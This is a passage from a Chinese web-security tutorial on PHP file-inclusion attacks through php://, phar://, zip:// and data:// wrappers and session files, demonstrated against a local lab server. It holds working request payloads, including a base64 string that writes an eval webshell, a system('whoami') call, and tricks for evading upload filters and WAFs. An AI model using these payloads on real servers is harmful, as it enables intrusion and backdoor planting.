    POST:
[](https://p3.ssl.qhimg.com/t01feb7db17e3f0ba02.png)
**php://input（写入木马）**
利用条件：
  1. allow_url_include = On。
  2. 对allow_url_fopen不做要求。
姿势：
    fileinclude.php?file=php://input
    POST:
    ');?>
执行完，同目录下便生成了马儿：
[](https://p1.ssl.qhimg.com/t01b3723bb5ec0ac1c5.png)
用shell管理工具，比如蚁剑等便能成功连接。
**php://filter**
元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。
利用条件：
  1. 对allow_url_include不做要求。
  2. 对allow_url_fopen不做要求。
姿势：
    fileinclude.php?file=php://filter/read=convert.base64-encode/resource=index.php
    另外一种：fileinclude.php?file=php://filter/convert.base64-encode/resource=index.php
    //效果跟前面的一样，少了read等关键字。在绕过一些waf时也许有用。
通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。
[](https://p4.ssl.qhimg.com/t01bb043f5ec0891c18.png)
其中`PD9waHAKZWNobyAiSGVsbG8gV29ybGQiOwo/Pg==`base64解码出来为如下，刚好是我同目录下的index.php的文件源码：
**phar://**
这个就是php解压缩包的一个伪协议，不管后缀是什么，都会当做压缩包来解压。
利用条件：
  1. php版本大于等于php5.3.0
  2. 对allow_url_include不做要求。
  3. 对allow_url_fopen不做要求。
姿势：
写一个文件phpinfo.php，其内容为``，打包成zip压缩文件格式的压缩包，如下：
[](https://p0.ssl.qhimg.com/t01da3a3524e70f5841.png)
指定绝对路径:
    fileinclude.php?file=phar://D:/phpStudy/PHPTutorial/WWW/test.zip/phpinfo.php
或者使用相对路径（这里`test.zip`就在当前目录下，和`fileinclude.php`同一目录）:
    fileinclude.php?file=phar://test.zip/phpinfo.php
[](https://p3.ssl.qhimg.com/t01d21f0370fbab1a7a.png)
**注意**
：其中`test.zip`必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过`test.zip`的后缀可以不是zip，可以是像`test.jpg`，甚至`test.111`这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为`test.111`这样的后缀肯定不会被拦截了，这时就能成功：
[](https://p5.ssl.qhimg.com/t01a50ba1ff96c58cfe.png)
[](https://p5.ssl.qhimg.com/t010018b0d16ddeb29a.png)
**phar://（命令执行）**
利用条件：
  1. php版本大于等于php5.3.0
  2. 对allow_url_include不做要求。
  3. 对allow_url_fopen不做要求。
姿势：
同`phar://`，只不过把文件内容改成``
**phar://（写入木马）**
利用条件：
  1. php版本大于等于php5.3.0
  2. 对allow_url_include不做要求。
  3. 对allow_url_fopen不做要求。
姿势：
写一个木马shell.php，其内容为``，打包成zip压缩文件格式的压缩包，如下：
[](https://p1.ssl.qhimg.com/t014e6490a3b230ea2f.png)
指定绝对路径
    http://192.168.1.4/fileinclude.php?file=phar://D:/phpStudy/PHPTutorial/WWW/test.zip/shell.php
或者使用相对路径（这里`test.zip`就在当前目录下）
    http://192.168.1.4/fileinclude.php?file=phar://test.zip/shell.php
先访问url地址，然后马儿就写进去了。
然后用shell管理工具，将上面两个的url地址随便选一个，填写到shell管理工具的url地址里，比如蚁剑等便能成功连接。
[](https://p0.ssl.qhimg.com/t0136fdc822f07013c1.png)
**注意**
：其中`test.zip`必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过`test.zip`的后缀可以不是zip，可以是像`test.jpg`，甚至`test.111`这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为`test.111`这样的后缀肯定不会被拦截了，这时就能成功。
**zip://**
zip伪协议和phar伪协议类似，但是用法不一样。
利用条件：
  1. php版本大于等于php5.3.0
  2. 对allow_url_include不做要求。
  3. 对allow_url_fopen不做要求。
姿势：  
构造zip包的方法同phar：
写一个文件phpinfo.php，其内容为``，打包成zip压缩文件格式的压缩包，如下：
[](https://p5.ssl.qhimg.com/t01b7f8fb5f276c39c8.png)
但是使用zip伪协议，需要指定绝对路径，而且压缩包文件和压缩包内的文件之间得用`#`，还要将`#`给URL编码为`%23`，之后填上压缩包内的文件。
    fileinclude.php?file=zip://D:/phpStudy/PHPTutorial/WWW/test.zip%23phpinfo.php
若是使用相对路径，则会文件包含失败。
**注意**
：这里需要注意的和`phar://`中的注意一样，其中`test.zip`必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过`test.zip`的后缀可以不是zip，可以是像`test.jpg`，甚至`test.111`这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为`test.111`这样的后缀肯定不会被拦截了，这时就能成功：
[](https://p3.ssl.qhimg.com/t01d121c348c5942daf.png)
**zip://（命令执行）**
利用条件：
  1. php版本大于等于php5.3.0
  2. 对allow_url_include不做要求。
  3. 对allow_url_fopen不做要求。
姿势：
同`zip://`，只不过把文件内容改成``
**zip://（写入木马）**
利用条件：
  1. php版本大于等于php5.3.0
  2. 对allow_url_include不做要求。
  3. 对allow_url_fopen不做要求。
姿势：  
构造zip包的方法同phar：
写一个木马shell.php，其内容为``，打包成zip压缩文件格式的压缩包，如下：
[](https://p2.ssl.qhimg.com/t017c103ca8a6934f38.png)
但是使用zip伪协议，需要指定绝对路径，而且压缩包文件和压缩包内的文件之间得用`#`，还要将`#`给URL编码为`%23`，之后填上压缩包内的文件。
    http://192.168.1.4/fileinclude.php?file=zip://D:/phpStudy/PHPTutorial/WWW/test.zip%23shell.php
先访问该url地址，然后马儿就写进去了。
若是使用相对路径，则会getshell失败。
**注意**
：这里需要注意的和`phar://`中的注意一样，其中`test.zip`必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过`test.zip`的后缀可以不是zip，可以是像`test.jpg`，甚至`test.111`这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为`test.111`这样的后缀肯定不会被拦截了，这时就能成功：
[](https://p4.ssl.qhimg.com/t01eab50d98c4e5daaf.png)
[](https://p5.ssl.qhimg.com/t0116fc8fd2617ce859.png)
**data://**
数据流封装器，和`php://`相似，都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。
利用条件：
  1. php版本大于等于php5.2
  2. allow_url_fopen = On
  3. allow_url_include = On
姿势一：
    fileinclude.php?file=data:text/plain,
[](https://p2.ssl.qhimg.com/t01a535fe6d57397610.png)
姿势二：
    fileinclude.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
`PD9waHAgcGhwaW5mbygpOz8+`的base64解码为：``。其中加号`+`的url编码为`%2b`。如果不手动url编码会报错：`Parse error: syntax error,
unexpected '?' in data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8 on line 1`
**data://（命令执行）**
利用条件：
  1. php版本大于等于php5.2
  2. allow_url_fopen = On
  3. allow_url_include = On
姿势一：
    fileinclude.php?file=data:text/plain,
姿势二：
    fileinclude.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
其中`PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==`的base64解码为：``
**data://（写入木马）**
利用条件：
  1. php版本大于等于php5.2
  2. allow_url_fopen = On
  3. allow_url_include = On
姿势一：
    fileinclude.php?file=data:text/plain,');?>
[](https://p0.ssl.qhimg.com/t0124975d224ae1d94b.png)
用shell管理工具，比如蚁剑等便能成功连接。
姿势二：
    fileinclude.php?file=data:text/plain;base64,PD9waHAgZnB1dHMoZm9wZW4oJ2hhY2sucGhwJywndycpLCc8P3BocCBAZXZhbCgkX1BPU1Rbdl0pPz4nKTs/Pg==
其中`PD9waHAgZnB1dHMoZm9wZW4oJ2hhY2sucGhwJywndycpLCc8P3BocCBAZXZhbCgkX1BPU1Rbdl0pPz4nKTs/Pg==`的base64解码为：`');?>`
###  包含session
利用条件：session文件路径已知，且其中内容部分可控。
姿势：
php的session文件的保存路径可以在phpinfo的`session.save_path`看到。
[](https://p5.ssl.qhimg.com/t01eef65e83d9b99ce5.png)
这里顺便提一下：第二列是`Local Value`（局部变量），第三列是`Master Value`（主变量）。其中`Master
Value`是PHP.ini文件中的内容。`Local value`是当前目录中的设置，这个值会覆盖`Master
Value`中对应的值。所以看的是第二列当前目录中的设置`D:\phpStudy\PHPTutorial\tmp\tmp`。
常见的php-session存放位置：
  1. `/var/lib/php/sess_PHPSESSID`
  2. `/var/lib/php/sess_PHPSESSID`
  3. `/tmp/sess_PHPSESSID`
  4. `/tmp/sessions/sess_PHPSESSID`